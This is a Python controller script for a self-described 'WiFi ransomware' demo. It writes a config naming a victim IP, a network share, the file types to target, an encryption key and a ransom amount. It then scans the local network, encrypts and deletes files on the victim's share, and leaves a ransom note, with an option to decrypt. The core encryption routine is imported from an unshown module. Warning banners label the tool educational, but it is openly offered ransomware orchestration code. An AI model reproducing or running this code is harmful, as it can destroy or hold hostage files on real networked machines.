# main.py - Main controller for WiFi ransomware
import os
import sys
from attack import WiFiRansomware


def load_config():
    """Load configuration from file"""
    # FIXED: Using Config.conf (your actual file name)
    if os.path.exists('Config.conf'):
        # Read existing config
        with open('Config.conf', 'r') as f:
            config_content = f.read()

        # Parse simple key=value format
        config_dict = {}
        for line in config_content.split('\n'):
            line = line.strip()
            if '=' in line and not line.startswith('#'):
                key, value = line.split('=', 1)
                config_dict[key.strip()] = value.strip()

        return config_dict
    else:
        # Create default config
        default_config = """# WiFi Ransomware Configuration
# Run setup_victim.bat on victim laptop first!

VICTIM_IP = 192.168.1.100
VICTIM_NAME = DESKTOP-VICTIM
SHARE_NAME = RansomDemo

TARGET_EXTENSIONS = .txt,.docx,.pdf,.jpg
ENCRYPTION_KEY = cybersecurity_demo_2024
RANSOM_AMOUNT = $500

SCAN_NETWORK = yes
NETWORK_RANGE = 192.168.1.0/24
"""
        with open('Config.conf', 'w') as f:
            f.write(default_config)

        print("Created default config file: Config.conf")
        print("Please edit it with victim's information.")
        return {}


def safety_check():
    """Prevent accidental execution"""
    print("\n" + "⚠" * 60)
    print("⚠ WARNING: This is REAL ransomware simulation!")
    print("⚠ EDUCATIONAL USE ONLY - AUTHORIZED NETWORKS ONLY")
    print("⚠" * 60)

    confirm = input("\nType 'I-UNDERSTAND-THIS-IS-A-DEMO' to continue: ")
    if confirm != 'I-UNDERSTAND-THIS-IS-A-DEMO':
        print("\nSafety check failed. Exiting.")
        sys.exit(0)


def main():
    print("=" * 60)
    print("       WIFI RANSOMWARE DEMO - ATTACKER")
    print("=" * 60)

    # Run safety check
    safety_check()

    # Load configuration
    config = load_config()
    if not config:
        return

    # Show current config
    print("\nCurrent Configuration:")
    for key, value in config.items():
        print(f"  {key}: {value}")

    # Initialize ransomware
    ransomware = WiFiRansomware(config)

    print("\n" + "-" * 60)
    print("1. Find and attack victim")
    print("2. Decrypt victim's files")
    print("3. Exit")

    choice = input("\nSelect option: ").strip()

    if choice == "1":
        # Find victim
        print("\nLooking for victim...")
        network_path = ransomware.find_victim()

        if network_path:
            print(f"Victim found at: {network_path}")

            # Double confirmation
            print("\n" + "!" * 60)
            print("WARNING: This will ENCRYPT and DELETE files!")
            print("!" * 60)

            confirm = input("\nType 'YES-ENCRYPT' to continue: ").lower()
            if confirm == 'yes-encrypt':
                encrypted = ransomware.attack_network_share(network_path)
                if encrypted > 0:
                    print(f"\n✓ Successfully encrypted {encrypted} files!")
                    print("Ransom note created on victim's share.")
                    print("\n🔑 Password for decryption:", config.get('ENCRYPTION_KEY', 'cybersecurity_demo_2024'))
                else:
                    print("\n⚠ No files were encrypted.")
            else:
                print("Attack cancelled.")
        else:
            print("\n✗ Could not find victim!")
            print("\nTroubleshooting:")
            print("1. Run setup_victim.bat on victim laptop")
            print("2. Make sure both laptops are on same WiFi")
            print("3. Check firewall settings on victim")
            print("4. Try using IP address instead of computer name")

    elif choice == "2":
        # Decrypt files
        print("\nLooking for victim to decrypt...")
        network_path = ransomware.find_victim()

        if network_path:
            print(f"\nVictim found at: {network_path}")
            print("Files with .locked extension will be decrypted.")

            password = input("\nEnter decryption password: ").strip()
            if not password:
                password = config.get('ENCRYPTION_KEY', 'cybersecurity_demo_2024')

            decrypted = ransomware.decrypt_network_share(network_path, password)

            if decrypted > 0:
                print(f"\n✓ Successfully decrypted {decrypted} files!")
            else:
                print("\n⚠ No files were decrypted.")
                print("Possible issues:")
                print("1. Wrong password (try: cybersecurity_demo_2024)")
                print("2. No .locked files found")
                print("3. Permission issues")
        else:
            print("✗ Could not find victim!")

    elif choice == "3":
        print("Exiting...")
        sys.exit(0)

    else:
        print("Invalid choice!")


if __name__ == "__main__":
    main()